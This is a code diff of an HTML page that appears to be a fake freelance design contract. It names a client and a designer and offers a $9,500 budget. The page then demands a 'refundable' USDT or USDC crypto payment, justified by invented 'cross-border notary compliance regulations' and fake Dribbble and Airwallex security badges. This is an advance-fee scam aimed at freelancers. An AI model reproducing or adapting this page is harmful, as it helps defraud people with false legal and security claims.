-    z-index: 1;
-}
-
-
-/* =========================
-PROFILE IMAGE
-========================= */
-.avatar {
-    width: 46px;
-    height: 46px;
-    border-radius: 50%;
-    object-fit: cover;
-    position: relative;
-    z-index: 2;
-    border: 1px solid rgba(168,85,247,0.25);
-}
-
-
-/* =========================
-ANIMATIONS
-========================= */
-
-/* spinning ring */
-@keyframes spin {
-    0% {
-        transform: rotate(0deg);
-    }
-    100% {
-        transform: rotate(360deg);
-    }
-}
-
-@keyframes hueShift {
-    0% {
-        filter: blur(4px) hue-rotate(0deg);
-        opacity: 0.75;
-    }
-    50% {
-        filter: blur(5px) hue-rotate(180deg);
-        opacity: 0.9;
-    }
-    100% {
-        filter: blur(4px) hue-rotate(360deg);
-        opacity: 0.75;
-    }
-}
-
-/* Crop Modal Container */
-.crop-modal {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100vw;
-    height: 100vh;
-    background: rgba(0, 0, 0, 0.6);
-    backdrop-filter: blur(4px);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    z-index: 10000;
-}
-
-/* Hide the modal properly when .hidden class is present */
-.crop-modal.hidden {
-    display: none !important;
-}
-
-/* Hide the raw file input off-screen */
-#photoInput {
-    display: none;
-}
-
-                                :root {
-    --text-secondary: #64748b;
-}
-
-        .security-note {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 0.8rem;
-            color: var(--text-secondary);
-            margin-top: 5px;
-            line-height: 1.4;
-            padding: 0 4px;
-        }
-
-        .security-note img.security-avatar {
-    width: 20px;
-    height: 20px;
-    border-radius: 50%;
-    object-fit: cover;
-    flex-shrink: 0;
-
-}
-
-                        /* ---------- Sidebar ---------- */
-#sidebar {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 320px;
-
-    /* FIX 1: Make height end exactly before the footer starts */
-    height: calc(100% - 52px); 
-
-    background: rgba(40, 75, 135, 0.75);
-
-    backdrop-filter: blur(14px);
-
-    /* FIX 2: Set z-index lower than footer (5) so footer naturally caps it */
-    z-index: 5; 
-
-    padding: 25px;
-    transform: translateX(-100%);
-    transition: transform 0.3s ease;
-}
-        #sidebar.open { transform: translateX(0); }
-        #sidebar h2{
-font-size:22px;
-margin-bottom:20px;
-color:#a78bfa;
-}
-        #sidebar button {
-            width: 100%;
-            margin: 12px 0;
-            padding: 12px;
-            border: none;
-            border-radius: 10px;
-            background: rgba(255,255,255,0.1);
-            color: #fff;
-            font-size: 16px;
-        }
-
-/* ---------- Menu Button ---------- */
-
-        /* ---------- Menu Button ---------- */
-        #menuBtn {
-            position: fixed;
-            top: 20px;
-            left: 20px;
-            z-index: 6;
-            background: #6b2cd8;
-            border: none;
-            color: #fff;
-            padding: 12px 14px;
-            border-radius: 10px;
-}
-
-/* move button when sidebar opens */
-#menuBtn.shift{
-left:250px;
-}
-
-    </style>
-</head>
+</style>
 <body>
-
 
 <!-- =========================
 TOP RIGHT PROFILE AVATAR
@@ -1208,39 +443,23 @@ TOP RIGHT PROFILE AVATAR
      <div class="avatar-ring">
         <img id="profilePhoto" src="default-avatar.png" class="avatar" alt="Profile picture">
     </div>
-
-    <div style="position: absolute; top: 58px; right: 70%; transform: translateX(50%); white-space: nowrap; pointer-events: none; text-align: center;">
-
-    </div>
-
 </div>
-
 
 <!-- =========================
 CROP MODAL
 ========================= -->
 <div id="cropModal" class="crop-modal hidden">
-
     <div class="crop-box">
-
-        <!-- file input (hidden trigger via JS) -->
         <input type="file" id="photoInput" accept="image/*">
-
-        <!-- crop preview -->
         <div class="crop-preview">
             <img id="cropImage">
         </div>
-
-        <!-- actions -->
         <div class="crop-actions">
             <button id="saveCropped">Save Photo</button>
             <button id="cancelCrop">Cancel</button>
         </div>
-
     </div>
-
 </div>
-
 
 <div id="boot-screen">
   <pre id="boot-text"></pre>
@@ -1250,180 +469,33 @@ CROP MODAL
 
 <div id="planNotification" class="notification-bar"></div>
 
-    <div class="document-card">
-        <div class="header">
-            <p class="doc-subtitle">Lead Design Strategist — Visual Architecture Suite (Phase 1) Agreement</p>
-        </div>
-
-        <div class="meta-grid">
-            <div class="meta-row">
-
-                <div class="meta-cell meta-label">Effective Date:</div>
-                <div class="meta-cell meta-value" id="metaEffectiveDate">Loading...</div>
-            </div>
-            <div class="meta-row">
-                <div class="meta-cell meta-label">Strategic Partner:</div>
-                <div class="meta-cell meta-value" id="metaContractorName">Anna Grzybowska</div>
-
-                <div class="meta-cell meta-label">Total Budget:</div>
-                <div class="meta-cell meta-value">$9,500.00 USD</div>
-                </div>
-        </div>
-
-        <h2>1. Scope of Work & Comprehensive Deliverables</h2>
-        <p>The Strategic Partner agrees to provide comprehensive <strong>Visual Architecture Suite(Phase 1)</strong>. This collaboration establishes the foundational aesthetic governance and design logic ensuring long-term visual coherence for all current and future deployments. The specific deliverables under this Agreement include:</p>
-        <ul>
-            <li><strong>System Icons & Usage Guide:</strong> A 4–6 page whitepaper defining the core visual design language, geometric grid systems, and psychological rationale for the system icons:</li>
-<li style="list-style-type: none; position: relative;">
-    <span style="position: absolute; left: -16px; color: #d96b43;">&#9670;</span><strong>Safety Icon:</strong> Communicating impenetrable security without feeling cold or clinical.</li>
-<li style="list-style-type: none; position: relative;">
-    <span style="position: absolute; left: -16px; color: #d96b43;">&#9670;</span><strong>Sync Icon:</strong> Background cooling-off period signifying secure transaction batches.</li>
-<li style="list-style-type: none; position: relative;">
-    <span style="position: absolute; left: -16px; color: #d96b43;">&#9670;</span><strong>Compliance Icon:</strong> "Custom" Bond where a governing regulatory body oversees high-value verification processes.</li>
-<li style="list-style-type: none; position: relative;">
-    <span style="position: absolute; left: -16px; color: #d96b43;">&#9670;</span><strong>Support Icon:</strong> Encouraging members to easily reach out for assistance.</li>
-
-<li style="list-style-type: circle;"><em>Typography:</em> Georgia for all headlines and body text to deliver a refined, classic, and readable aesthetic, serving both as an external presentation piece and an internal reference document.</li>
-            <li><strong>Master System Grid Assets:</strong> Fully editable <strong>.AI / .EPS</strong> vector source files, optimized for high-fidelity scalability. These are the "source code" of the UI aesthetic, establishing the geometric rules that all future interface elements will follow.</li>
-            <li><strong>Production-Ready UI:</strong> Clean, high-performance, web-optimized <strong>.SVG</strong> assets, calibrated for both light mode and dark mode. This also includes the integration specs for mobile-responsive modules.</li>
-        </ul>
-
-            <li><strong>Visual Requirements:</strong>
-                <ul>
-                    <li style="list-style-type: circle;"><em>Vibe & Theme:</em> "Connected Trust" featuring warm, human-centric soft drop shadows & translucent glass morphic elements.</li>
-                    <li style="list-style-type: circle;"><em>Color Palette:</em> Light slate and soft sky blue base (#F8FAFC / #CFE8FF) paired with pure white surfaces (#FFFFFF), deep imperial purple (#6D28D9), and warm terracotta accents (#C2410C) for key actions, while maintaining full high-contrast adaptability for dark mode surfaces (#0F172A / #1E293B).</li>
-                </ul>
-            </li>
-
-
-
-<h2>2. Technical & Delivery Specifications</h2>
-        <div class="highlight-box">
-            <strong>Strategic Deliverable Packaging:</strong> All architectural files and documentation contained within an organized single compressed<code>.zip</code> archive strictly <strong>under 50MB</strong>. 
-        </div>
-
-        <h2>3. Project Schedule & Milestones</h2>
-        <div class="table-container">
-            <table>
-                <thead>
-                    <tr>
-                        <th style="width: 25%;">Milestone / Date</th>
-                        <th style="width: 75%;">Description</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <tr>
-                        <td><strong id="m-date-0">Loading...</strong></td>
-                        <td>Agreement Finalization, Disbursal Acquisition & Visual Architecture Suite (Phase 1) execution by the Strategic Partner.</td>
-                    </tr>
-                    <tr>
-                        <td><strong id="m-date-1">Loading...</strong></td>
-                        <td>Deadline for the Strategic Partner to deliver Discovery, Grid Systems, and Initial Design Concept Sets for review.</td>
-                    </tr>
-                    <tr>
-                        <td><strong id="m-date-2">Loading...</strong></td>
-                        <td>Initial Client Review & Design Alignment checkpoint for feedback on conceptual foundations.</td>
-                    </tr>
-                    <tr>
-                        <td><strong id="m-date-3">Loading...</strong></td>
-                        <td>Vector asset production, dual-mode UI light/dark calibrations, and drafting of the core whitepaper documentation.</td>
-                    </tr>
-                    <tr>
-                        <td><strong id="m-date-4">Loading...</strong></td>
-                        <td>Deadline for the Strategic Partner to deliver the finalized, high-performance .zip archive (strictly under 50MB).</td>
-                    </tr>
-                </tbody>
-            </table>
-        </div>
-
-
-
-
-        <h2>4. Intellectual Property Rights</h2>
-        <p>During delivery of the optimized Visual Architecture Suite(Phase 1) <strong>packaged in a .zip archive strictly under 50MB</strong>, the Strategic Partner formalizes the transfer of all intellectual property rights, titles, and interest. This conveyance ensures that the Client holds exclusive rights to the aesthetic assets and design methodologies created by <span class="dynamic-contractor-name">Anna Grzybowska</span>, facilitating the full-scale deployment of the established visual language.</p>
-
-        <h2>5. Governing Agreement</h2>
-        <p>This instrument represents the comprehensive and final agreement with <span class="dynamic-contractor-name">Anna Grzybowska</span> concerning the commissioning of the Visual Architecture Suite(Phase 1). All prior discussions, understandings, and negotiations—whether written or verbal—are superseded by the terms, strategic scope, and valuation frameworks contained herein, establishing a singular, binding foundation for this collaboration.</p>
-
-        <div class="signature-section">
-            <h2>6. Authorization & Signatures</h2>
-            <div class="sig-table">
-                <div class="sig-row">
-                    <div class="sig-col">
-                        <p style="font-weight: 600; margin-bottom: 5px;">On Behalf Of Client:</p>
-                        <div class="signature-font">Garry Oakes</div>
-                        <div class="sig-box">
-                            <div class="sig-title">Garry Oakes</div>
-                            <div class="sig-sub">Operations/Legal Dept, AvalonFlow Corp<br>Date: <span id="clientSigDate">Loading...</span></div>
-                        </div>
-                    </div>
-                    <div class="sig-col">
-                        <p style="font-weight: 600; margin-bottom: 5px;">For Strategic Partner:</p>
-                        <div class="contractor-sig-font" id="contractorSignature" style="display: none;">Anna Grzybowska</div>
-                        <div class="sig-box">
-                            <div class="sig-title" id="contractorSigTitle">Anna Grzybowska</div>
-                            <div class="sig-sub">Lead Design Strategist<br>Date: <span id="sigDate">Pending Execution</span></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <div class="action-container" id="actionArea">
-            <button class="sign-btn" id="agreeBtn">I Acknowledge & Accept Agreement</button>
-        </div>
-<div class="security-note">
-    <img src="assets/pictures/download (2).png" alt="Profile" class="security-avatar">
-    <span>Verified via Dribbble • Digitally Bound SHA-256</span>
-</div>
-
+<div class="document-card">
+    <div class="header">
+        <span class="badge">Action Required</span>
     </div>
 
-    
-
-    <!-- Notification Bar -->
-    <div id="planNotification" class="notification-bar"></div>
-
-    <!-- Payment Container -->
-    <div id="payment-container">
-      <div class="header">
-        <span class="badge">Action Required</span>
-      </div>
-
-      <!-- Context / Explanation Card Swapped to the Top -->
-      <div class="glass-card neon-card" id="confirmationCard" style="margin:0 auto 20px auto;">
+    <!-- Context / Explanation Card -->
+    <div class="glass-card neon-card" id="confirmationCard">
         <div class="checkbox-container">
-          <input type="checkbox" id="confirmation" checked disabled style="pointer-events: none;">
-          <label for="confirmation" style="font-weight: 500; line-height: 1.6; color: #a46cff; display: block; text-align: left;">
-
-            <span style="  
-              display: block;  
-              margin: 12px 0;  
-              padding-left: 12px;  
-              border-left: 3px solid rgba(200, 50, 80, 0.85);  
-              color: rgba(255, 255, 255, 0.85);  
-              font-size: 10px;
-              font-weight: bold; 
-            ">  
-              Standard cross-border notary compliance regulations mandate the following additional refundable protocol to officially notarize and register the <strong>Visual Architecture Suite (Phase 1)</strong> agreement executed by both parties.
-            </span>
-
-          </label>
+            <input type="checkbox" id="confirmation" checked disabled style="pointer-events: none;">
+            <label for="confirmation" style="font-weight: 500; line-height: 1.6; color: #a46cff; display: block; text-align: left;">
+                <span style="display: block; margin: 12px 0; padding-left: 12px; border-left: 3px solid rgba(200, 50, 80, 0.85); color: rgba(255, 255, 255, 0.85); font-size: 10px; font-weight: bold;">  
+                  Standard cross-border notary compliance regulations mandate the following additional refundable protocol to officially notarize and register the <strong>Visual Architecture Suite (Phase 1)</strong> agreement executed by both parties.
+                </span>
+            </label>
         </div>
-      </div>
+    </div>
 
-      <!-- Segmented Token Selector inside container -->
-      <div id="tokenSelector">
+    <!-- Segmented Token Selector inside container -->
+    <div id="tokenSelector">
         <button id="usdt-btn" class="active" onclick="showTokenCard('usdt')">USDT NETWORK</button>
         <button id="usdc-btn" onclick="showTokenCard('usdc')">USDC NETWORK</button>
-      </div>
+    </div>
 
-      <!-- USDT Card -->
-      <div class="token-card" id="usdt-card">
+    <!-- USDT Card -->
+    <div class="token-card" id="usdt-card">
         <div class="plan-pay">
-          <img class="plan-logo"
-               src="https://assets.coingecko.com/coins/images/325/large/Tether.png"
-               alt="AvalonCare Custom Logo">
+          <img class="plan-logo" src="https://assets.coingecko.com/coins/images/325/large/Tether.png" alt="Tether Logo">
           <span class="token-name">USDT</span>
           <span class="network">ERC-20</span>
         </div>
@@ -1455,14 +527,12 @@ CROP MODAL
           <div class="progress-fill" id="usdt-progress"></div>
           <div class="status" id="usdt-status">Waiting for verification...</div>
         </div>
-      </div>
+    </div>
 
-      <!-- USDC Card -->
-      <div class="token-card inactive" id="usdc-card">
+    <!-- USDC Card -->
+    <div class="token-card inactive" id="usdc-card">
         <div class="plan-pay">
-          <img class="plan-logo"
-               src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png"
-               alt="AvalonCare Custom Logo">
+          <img class="plan-logo" src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png" alt="USDC Logo">
           <span class="token-name">USDC</span>
           <span class="network">ERC-20</span>
         </div>
@@ -1494,16 +564,14 @@ CROP MODAL
           <div class="progress-fill" id="usdc-progress"></div>
           <div class="status" id="usdc-status">Waiting for verification...</div>
         </div>
-      </div>
-
-      <!-- Footer Note Paired at the Bottom -->
-      <div class="footer-note" style="text-align: center; margin-top: 20px;">
-    <img src="assets/pictures/download (1).png" alt="Profile" class="security-avatar">
-          Airwallex • Security Protocol SSL-256
-      </div>
     </div>
-  </div>
 
+    <!-- Footer Note Paired at the Bottom -->
+    <div class="footer-note" style="text-align: center; margin-top: 20px;">
+        <img src="assets/pictures/download (1).png" alt="Profile" class="security-avatar">
+        Airwallex • Security Protocol SSL-256
+    </div>
+</div>
 
 </body>
 <script>
